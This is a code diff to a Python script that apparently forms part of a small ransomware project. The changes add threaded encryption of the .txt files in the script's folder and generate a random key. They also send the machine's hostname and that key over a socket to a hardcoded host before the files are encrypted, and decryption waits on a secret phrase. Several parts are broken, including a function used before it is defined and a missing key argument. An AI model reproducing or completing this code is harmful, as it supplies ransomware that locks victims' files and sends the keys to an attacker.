@@ -1,45 +1,17 @@
 import os
 import sys
-import logging
+import socket
+import threading
+import queue
+import random
 from encrypt import encrypt
 from decrypt import decrypt
-
-
-
-# Encrypt files
-def encrypt_file(key, filename):
-
-    # Load the content of file
-    with open(filename, 'r') as file:
-        content = file.read()
-
-    # Encrypt data
-    encrypted_data = encrypt(content, key)
-
-    # Rewrite the encrypted data in file
-    with open(filename, 'w') as file:
-        file.write(encrypted_data)
-
-
-# Encrypt files
-def decrypt_file(key, filename):
-
-    # Load the content of file
-    with open(filename, 'r') as file:
-        content = file.read()
-
-    # Decrypt data
-    decrypted_data = decrypt(content, key)
-
-    # Rewrite the decrypted data in file
-    with open(filename, 'w') as file:
-        content = file.write(decrypted_data)
 
 
 # List of file paths in path
 def file_paths(path):
 
-    files = []
+    file_paths = []
     code_files = ["maze.py", "decrypt.py", "encrypt.py", "README.md", ".gitignore"]
     for file in os.listdir(path):
 
@@ -51,37 +23,110 @@ def file_paths(path):
 
         # Only considering text files
         if os.path.isfile(file_path) and file.endswith(".txt"):
-            files.append(file_path)
+            file_paths.append(file_path)
 
-    return files
+    return file_paths
 
 
 # Encrypt files
-def encrypt_all_files(key, path):
+def encrypt_files(key, path):
     
     encrypted_files = 0
-    files = file_paths(path)
+    file_paths = file_paths(path)
 
-    # Encrypt each file in path
-    for file in files:
-        encrypt_file(key, file)
+    q = queue.Queue()
+
+    # enter files in queue
+    for file in file_paths:
+        q.put(file)
         encrypted_files += 1
+    
+    # use thread to encrypt
+    for i in range(30):
+        thread = threading.Thread(target=func, daemon=True)
+        thread.start()
+
+    q.join()  # checks for if threads completed the task (q.task_done())
+
+    def func(key):
+        while q.not_empty:
+
+            file = q.get()
+
+            # Load the content of file
+            with open(file, 'r') as f:
+                content = f.read()
+
+            # Encrypt data
+            encrypted_data = encrypt(content, key)
+
+            # Rewrite the encrypted data
+            with open(file, 'w') as f:
+                f.write(encrypted_data)
+            
+            q.task_done()
 
     return encrypted_files
 
 
 # Decrypt files
-def decrypt_all_files(key, path):
+def decrypt_files(key, path):
     
     decrypted_files = 0
-    files = file_paths(path)
+    file_paths = file_paths(path)
 
-    # Decrypt each file in path
-    for file in files:
-        decrypt_file(key, file)
+    q = queue.Queue()
+
+    # enter files in queue
+    for file in file_paths:
+        q.put(file)
         decrypted_files += 1
 
+    # use thread to decrypt
+    for i in range(30):
+        thread = threading.Thread(target=func, daemon=True)
+        thread.start()
+
+    q.join() 
+
+    def func(key):
+        while q.not_empty:
+
+            file = q.get()
+
+            # Load the content of file
+            with open(file, 'r') as f:
+                content = f.read()
+
+            # Decrypt data
+            decrypted_data = decrypt(content, key)
+
+            # Rewrite the decrypted data
+            with open(file, 'w') as f:
+                content = f.write(decrypted_data)
+            
+            q.task_done()
+
     return decrypted_files
+
+
+# Generate Key
+def generate_key():
+
+    key_length = 128 // 8
+
+    # employing char pool (every combination possible in 8bit)
+    char_pool = ''
+    for ch in range(0x00, 0xFF):
+        char_pool += chr(ch)
+
+
+    # designing the key
+    key = ''
+    for i in range(key_length):
+        key += random.choice(char_pool)
+
+    return key
 
 
 # MAIN FUNCTION 
@@ -94,20 +139,33 @@ if __name__ == '__main__':
         quit()
 
 
-    # Key (using caesar cipher for now!)
-    key = 2
+    # random key is generated every time
+    key = generate_key()
 
-    # Encrypt files of same folder (which has maze)
+    # client host name
+    hostname = os.getenv('COMPUTERNAME')
+
+    # host ip address and port
+    IP_ADDRESS = '192.168.1.4' 
+    PORT = 5678
+
+    # establishing connection
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((IP_ADDRESS, PORT))
+        s.send(f'{IP_ADDRESS}: {hostname}:{key} ')
+
+
+    # Encrypt file (same folder)
     path = os.path.dirname(os.path.abspath(__file__))
-    no_encrypted_files = encrypt_all_files(path)
-    print('Number of encrypted files: {}'.format(no_encrypted_files))
+    count = encrypt_files(path)
+    print(f'Number of encrypted files: {count}')
 
 
-    # Ransomware real work
+    # Decrypt files
     secret_phrase = "Don't let the muggles get you down"
     user_phrase = input('Enter the secret phrase: ')    
 
     if(user_phrase == secret_phrase):
-        decrypt_all_files(key, path)
+        decrypt_files(key, path)
     else:    
-        print("Sorry, rong phrase!")    
+        print("Sorry, wrong phrase!")    
